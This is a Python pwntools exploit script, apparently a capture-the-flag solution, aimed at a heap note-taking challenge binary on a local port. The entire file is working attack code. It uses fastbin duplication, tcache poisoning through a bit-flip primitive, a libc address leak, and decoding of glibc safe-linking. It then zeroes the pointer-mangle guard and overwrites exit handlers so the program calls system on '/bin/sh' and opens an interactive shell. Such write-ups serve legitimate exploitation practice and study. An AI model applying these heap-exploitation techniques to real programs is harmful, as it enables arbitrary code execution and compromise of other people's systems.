import pwn
import os

limit=0x2cbfff+1
# on docker setup:
# p = pwn.process(['prlimit',f'--rss={limit}',f'--as={limit}','/vuln'])

p = pwn.remote("localhost",12345)

sizes = []
read_idx = None
n = 0
dummies = {0xa0:[], 0x80:[]}
tar = None
fake = None
heap_leak = None
system = None
binsh = None
mem = None

def getidx():
    i = 0
    while True:
        if i in sizes:
            i += 1
            continue
        sizes.append(i)
        return i

def add(note):
    global n
    n -= 1
    if n-0x12 <= 0:
        n = 0x13
    p.sendlineafter(b'>',(n-0x12) * b'a')
    p.sendlineafter(b'Note: ',note)
    return getidx()

def quit():
    p.sendlineafter(b'>',b'q')

def dec_n():
    global n
    n-=1
    if n - 0x12 <= 0:
        n = 0x13

def edit(idx,note, padding = False):
    global n
    dec_n()
    p.sendlineafter(b'>',(n-0x12) * b'e')
    
    dec_n()
    p.sendlineafter(b'Index: ',f'{idx}'.encode().rjust(n-0x12,b' '))


    if not padding:
        p.sendlineafter(b'Note: ',note)
        n = len(note) -1
    else:
        n-=1
        p.sendlineafter(b'Note: ', note + (n-0x12 - len(note))* b'p')

def remove(idx):
    dec_n()
    p.sendlineafter(b'>',(n-0x12) * b'r')

    dec_n()
    p.sendlineafter(b'Index: ',f'{idx}'.encode().rjust(n-0x12,b' '))

    if not idx in sizes:
        print("double free")
        return
    sizes.remove(idx)

def flipnote(idx,byte, bit):
    global n
    
    n -= 1
    p.sendlineafter(b'>',(n-0x12) * b'f')
    
    n -= 1
    p.sendlineafter(b'Index: ',f'{idx}'.encode().rjust(n-0x12,b' '))
    
    n -= 1
    offset = 8 * byte +bit
    p.sendlineafter(b'Offset: ',f'{offset}'.encode().rjust(n-0x12,b' '))




def realloc_lb_helper(i):
    global n
    n = i
    i -= 0x12 # i is the actual chunk size
    p.sendlineafter(b'>',i * b'i') # trigger Invalid Option to don't change anything else

def realloc_lb(i):
    realloc_lb_helper((i>>1)+0x9)
    realloc_lb_helper(i)


def empty(size, k =7):
    arr = dummies[size]
    for i in range(k):
        tmp = add((size-0x10) * b'd')
        arr.append(tmp)

def fill(k,size):
    arr = dummies[size]
    for i in range(k):
        remove(arr[i])



def leak_libc():
    global tar, fake
    # fill tcache of size 0xa0
    realloc_lb(7*0xa0+0xd0)
    realloc_lb(6*0xa0+0xd0)
    realloc_lb(5*0xa0+0xd0)
    realloc_lb(4*0xa0+0xd0)
    realloc_lb(3*0xa0+0xd0)
    realloc_lb(2*0xa0+0xd0)
    realloc_lb(1*0xa0+0xd0)
    realloc_lb(0xd0) # force some specific alignment for flip later
    realloc_lb(0xc0)
    realloc_lb(0x90)
    realloc_lb(0x60)
    realloc_lb(0x30)
    realloc_lb(0xa0)
    realloc_lb(0x80)
    flip = add(b'flip')
    
    # fast dup
    realloc_lb(0xb0) # free target chunk
    tar = add(b'tar') # allocate target chunk

    empty(0x80) # fill tcache
    fill(7,0x80)

    remove(tar) # fill fastbin
    remove(flip)
    remove(tar)

    empty(0x80) # empty tcache

    realloc_lb(0x60) # split 0x100 chunk into chunks smaller than 0x80
    # the next chunk of size 0x80 is the same as tar
    realloc_lb(0x80)

    # insert dummies, to allocate tar at note index 15, so fake won't overwrite it later
    empty(0xa0,6)

    flip = add(b"flip") # allocate tar and flip again
    tar = add(b"tar")

    fill(6,0xa0)


    # flip -> tar in tcache
    remove(tar)
    remove(flip)
    
    # tcache poisoning
    flipnote(flip,0,4)
    flip = add(b'flip')
    
    realloc_lb(0x80) # increase size var again
    
    global n, mem
    size = n-0x20
    fake = add(0x8 * b'h'+pwn.p64(0x81) +size * b'h')

    fill(6,0x80) # 7th is now corrupted
    
    realloc_lb(0x80) # increase size var again
    edit(fake, 0x8 * b'h' +pwn.p64(0xa1),padding = True)
    
    
    # now take all available memory
    mem = add((0x1e010 - 0x100)* b'm')
    add((0xf10 - 0x100 )* b'm')
    add((0x790 -0x100 )* b'm')
    add((0x3d0 - 0x100 )* b'm')
    add((0x100 - 0x50)* b'm')
    add((0x100 - 0x50)* b'm')
    
    remove(tar)
    realloc_lb_helper(0x80)
    leak = pwn.u64(p.recvline().split(b'Invalid option: ')[1][:-1].ljust(8,b'\x00'))
    print("libc leak: ",hex(leak))
    return leak    

def dec_safe_linking(cipher):
    key = 0
    for i in range(1,7):
        bits = 64 - 12 * i 
        if bits < 0 :
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
        #print(f"round {i}:\n");
        #print(f"key:    {key:#018x}")
        #print(f"plain:  {plain:#018x}")
        #print(f"cipher: {cipher:#018x}")
        #print()
    return plain

def enc_safe_linking(addr, plain):
    return (addr >> 12 )^ plain 

def edit_mangle(addr):
    global n 
    global heap_leak
    #n = 0x13
    
    #realloc_lb(0x80) # leave the chunk before
    dummi1 = add(b'dummi')
    dummi2 = add(b'dummi')
    edit(fake, 0x8 * b'h' + pwn.p64(0x81)+0x20 * b'h')
    realloc_lb(0x80)
    remove(tar)
    realloc_lb_helper(0x80)

    heap_leak = pwn.u64(p.recvline().split(b'Invalid option: ')[1][:-1].ljust(8,b'\x00'))
    heap_leak = dec_safe_linking(heap_leak) - 0x130 -0x80
    print(hex(heap_leak))

    target = enc_safe_linking(heap_leak,addr)
    print(hex(target))

    # dub fast
    

    #remove(1)
    remove(9)
    realloc_lb_helper(0x78)
    p.sendlineafter(b'>',0x78 * b'x' + pwn.p64(0x20)+0x18 * b'y' + pwn.p64(0x80) + pwn.p64(target))


    #zero mangle
    last = add(b'')
    mangle = add(0x18 * b'\x00') # nothing + canary + mangle
    return last
    

def rol(value, shift, bits=64):
    return ((value << shift) | (value >> (bits - shift))) & ((1 << bits) - 1)

def edit_exit_func(addr,idx):
    remove(1)
    remove(idx)
    
    target = enc_safe_linking(heap_leak,addr)
    realloc_lb_helper(0x78)
    p.sendlineafter(b'>',0x78 * b'x' + pwn.p64(0x20)+0x18 * b'y' + pwn.p64(0x80) + pwn.p64(target))

    add(b'')
    add(pwn.p64(4) + pwn.p64(rol(system,0x11)) + pwn.p64(binsh))

def main():
    try:
        global system,binsh
        input('start')
        leak = leak_libc()

        system = leak - 0x1ca000
        binsh = system + 0x187908
        exit_func = system + 0x1cb1c0
        execve = system + 0x9a310
        
        # tls_base + 0x770
        tls_mangle = system - 0x53600
        
        idx = edit_mangle(tls_mangle)


        #system = execve
        edit_exit_func(exit_func,idx)
        
        # on docker: os.system('prlimit --rss=-1 --as=-1 --pid=$(pidof vuln)')
        input("enter on server: prlimit --rss=-1 --as=-1 --pid=$(pidof vuln)")
        remove(mem)
        p.sendline(b'q')
        p.interactive()
    except EOFError:
        print(p.recvall())

if __name__ == "__main__":
    main()
